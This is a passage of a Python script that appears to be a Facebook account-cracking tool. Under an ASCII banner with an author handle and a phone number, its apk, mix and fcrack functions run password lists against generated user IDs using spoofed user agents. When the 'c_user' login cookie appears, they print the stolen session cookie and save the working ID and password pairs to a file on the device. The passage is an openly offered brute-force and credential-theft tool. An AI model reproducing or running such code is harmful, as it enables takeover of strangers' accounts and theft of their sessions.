...
#S4GORUL TERA PAPPA [RMX]
#---------------------[IMPORT]---------------------#
from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules....\n It will take some seconds...TOX   W8 update Tool..')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/TOXIC-S4GOR/TOXIC-GREEN/blob/main/approvel.txt').text
        ff=open('show.txt','w')
...
\033[1;92m     88888888888 .d88888b. Y88b   d88P 8888888 .d8888b.  
\033[1;37m           888    d88P" "Y88b Y88b d88P    888  d88P  Y88b 
\033[1;37m           888    888     888  Y88o88P     888  888    888 
\033[1;92m           888    888     888   Y888P      888  888        
\033[1;37m           888    888     888   d888b      888  888        
\033[1;92m           888    888     888  d88888b     888  888    888 
\033[1;37m           888    Y88b. .d88P d88P Y88b    888  Y88b  d88P 
\033[1;92m           888     "Y88888P" d88P   Y88b 8888888 "Y8888P"  
\033[1;37m                                                                                                     
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : S4GOR          │ 
\033[1;37m│ ❲★❳ GITHUB   : TOXIC-S4GOR             |
\033[1;37m│ ❲★❳ WHATSAPP : +88 01831018711        │
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : TOX-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : TOX-RNDM-CP.txt  ")
...
def random_gmail():
    ...
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    print(f"  {K}EXAMPLE : \033[1;97mRakib , S4GOR , Mehedi , Sumaiya , Ridoy") 
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[S4GOR] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/TOX-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[S4GORUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}S4GOR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/TOX-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [S4GOR>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/TOX-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
